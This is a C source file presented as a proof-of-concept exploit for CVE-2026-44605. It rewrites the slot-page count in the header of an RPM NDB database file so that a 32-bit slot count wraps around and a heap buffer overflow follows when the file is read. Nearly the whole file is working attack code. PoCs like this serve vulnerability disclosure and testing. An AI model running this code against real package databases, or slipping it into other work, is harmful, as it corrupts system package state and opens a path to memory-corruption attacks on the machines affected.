/*
 * CVE-2026-44605 PoC
 *
 * Tampers with an NDB database file to trigger an integer wraparound and a
 * subsequent heap buffer overflow.
 *
 * Usage: ./ndb-corruptor NDB_FILE NUM_PAGES
 *	NDB_FILE: NDB file to corrupt
 *	NUM_PAGES: pages to allocate
 */

#include <assert.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// NDB macros (from lib/backend/ndb/rpmpkg.c)
#define PKGDB_OFFSET_SLOTNPAGES 12
#define SLOT_SIZE		16
#define PAGE_SIZE		4096

#define UINT_SIZE ((uint64_t)1 << 32)
// Slots per page
#define PAGE_SLOTS (PAGE_SIZE / SLOT_SIZE)

int main(int argc, char **argv)
{
    if (argc < 3) {
	fprintf(stderr, "Error: Missing arguments\n");
	exit(1);
    }

    FILE *fd = NULL;
    const char *dbpath = argv[1];
    int allocpages = atoi(argv[2]);

    unsigned int slotnpages = (UINT_SIZE / PAGE_SLOTS) + allocpages;
    uint64_t numslots64 = (uint64_t)slotnpages * PAGE_SLOTS;
    uint32_t numslots32 = numslots64;

    assert(numslots64 > numslots32);
    printf("Header: %lu slots (%lu pages)\n", numslots64, slotnpages);
    printf("Allocate: %u slots (%i pages)\n", numslots32, allocpages);

    fd = fopen(dbpath, "r+b");
    fseek(fd, PKGDB_OFFSET_SLOTNPAGES, SEEK_SET);
    fwrite(&slotnpages, sizeof(slotnpages), 1, fd);
    fclose(fd);
}
